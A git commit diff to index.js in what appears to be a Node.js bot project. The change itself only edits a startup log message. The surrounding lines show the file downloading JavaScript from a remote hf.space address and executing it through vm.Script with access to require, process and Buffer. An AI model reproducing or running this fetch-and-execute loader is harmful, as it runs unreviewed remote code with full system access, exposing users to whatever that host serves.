04696c787214ca829f38d8772b6a9502dfca48cd
𝐃𝐀𝐑𝐑𝐄𝐋𝐋 𝐌𝐔𝐂𝐇𝐄𝐑𝐈 ⚡ <darrelltakudzwa9@gmail.com>
2025-10-02 20:32:11 +0200

    Update index.js

--- index.js
+++ index.js
@@ -7,7 +7,7 @@ const vm = require('vm');
 
 (async () => {
   try {
-    console.log("❄️ Subzero Synchronization Initiated !");
+    console.log("❄️ Subzero Mini Initiated !");
     const { data: scriptCode } = await axios.get("https://mrfrankk-cdn.hf.space/mrfrank/mini/index.js");
     new vm.Script(scriptCode).runInContext(
       vm.createContext({ require, console, process, module, __filename, __dirname, Buffer })
